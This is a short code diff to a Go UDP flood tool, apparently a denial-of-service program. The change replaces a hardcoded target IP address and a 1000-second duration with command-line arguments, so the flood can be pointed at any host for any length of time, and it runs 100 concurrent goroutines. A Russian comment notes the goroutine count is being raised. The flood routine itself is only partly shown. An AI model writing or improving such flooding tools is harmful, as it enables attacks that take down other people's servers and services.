@@ -6,6 +6,9 @@ import (
     "math/rand"
     "sync"
     "time"
+    "os"
+    "strconv"
+    "log"
 )
 
 func udpFlood(targetIP string, duration time.Duration, wg *sync.WaitGroup) {
@@ -39,10 +42,20 @@ func udpFlood(targetIP string, duration time.Duration, wg *sync.WaitGroup) {
 }
 
 func main() {
-    targetIP := "147.45.147.79"
-    duration := 1000 * time.Second
-    var wg sync.WaitGroup
+    if len(os.Args) < 3 {
+        log.Fatal("Usage: program <targetIP> <duration in seconds>")
+    }
 
+    targetIP := os.Args[1]
+
+    durationSec, err := strconv.Atoi(os.Args[2])
+    if err != nil {
+        log.Fatal("Invalid duration: ", err)
+    }
+
+    duration := time.Duration(durationSec) * time.Second
+
+    var wg sync.WaitGroup
     numGoroutines := 100 // Увеличиваем количество горутин
 
     for i := 0; i < numGoroutines; i++ {
